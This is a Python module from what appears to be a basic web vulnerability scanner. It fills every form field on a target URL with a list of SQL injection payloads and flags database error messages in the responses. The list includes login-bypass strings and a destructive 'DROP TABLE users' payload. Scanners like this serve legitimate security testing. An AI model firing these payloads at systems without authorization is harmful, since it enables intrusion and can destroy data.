import requests
from scanner.forms import get_forms, extract_form_details

SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 'a'='a",
    "'; DROP TABLE users; --",
    "' OR 1=1 LIMIT 1 --",
    "' OR sleep(5)--",
    "' OR 1=1#",
    "admin' --",
    "' OR 'x'='x"
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQLSTATE"
]

def test_sqli(url):
    vulnerable = []
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} form(s) on {url}")

    for i, form in enumerate(forms, 1):
        details = extract_form_details(form, url)
        target_url = details["action"]
        method = details["method"]

        for payload in SQLI_PAYLOADS:
            data = {}
            for field in details["fields"]:
                if field["name"]:
                    data[field["name"]] = payload

            print(f"  [Form {i}] Testing payload: {payload}")

            try:
                if method == "post":
                    res = requests.post(target_url, data=data, timeout=5)
                else:
                    res = requests.get(target_url, params=data, timeout=5)

                for error in SQL_ERRORS:
                    if error.lower() in res.text.lower():
                        print(f"    [⚠️] SQL Injection vulnerability likely! Payload: {payload}")
                        vulnerable.append((target_url, data, payload))
                        break
                else:
                    print(f"    [✔] No SQL error found for this payload.")
            except Exception as e:
                print(f"    [!] Error during SQLi test: {e}")

    return vulnerable
